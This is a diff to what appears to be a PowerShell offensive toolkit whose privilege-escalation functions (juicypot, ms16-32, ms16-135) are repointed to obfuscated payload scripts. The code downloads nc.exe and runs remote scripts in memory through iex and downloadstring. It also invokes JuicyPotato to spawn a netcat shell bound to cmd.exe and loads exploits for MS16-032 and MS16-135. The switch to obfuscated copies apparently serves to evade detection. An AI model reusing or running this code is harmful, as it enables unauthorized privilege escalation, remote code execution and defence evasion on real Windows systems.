@@ -537,7 +537,7 @@ __        ___       ____
   \ V  V / | | | | |  __/ \ V  V /| | | |
    \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
 
-   --> Localreconmodules
+   --> Get System
 
 '@
         
@@ -585,12 +585,12 @@ function juicypot
     Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
     if ([Environment]::Is64BitProcess)
     {
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/JuicyPotato.ps1')
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/juicypotato64.ps1')
         Invoke-JuicyPotato -Command "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
     }
     else
     {
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/JuicyPotato32.ps1')
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/invoke-juicypotato.ps1')
         Invoke-JuicyPotato -Command "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
     }
     Start-Sleep -Seconds 3
@@ -670,13 +670,13 @@ function CVE-2019-1069
 
 function ms16-32
 {
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/41aca9192f3dec6281250eef0798d5da7eab417b/PowershellScripts/Invoke-MS16-032.ps1')
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/ms16-32.ps1')
     Invoke-MS16-032
 }
 
 function ms16-135
 {
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/MS16-135.ps1')
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/ms16-135.ps1')
 }
 
 function localreconmodules
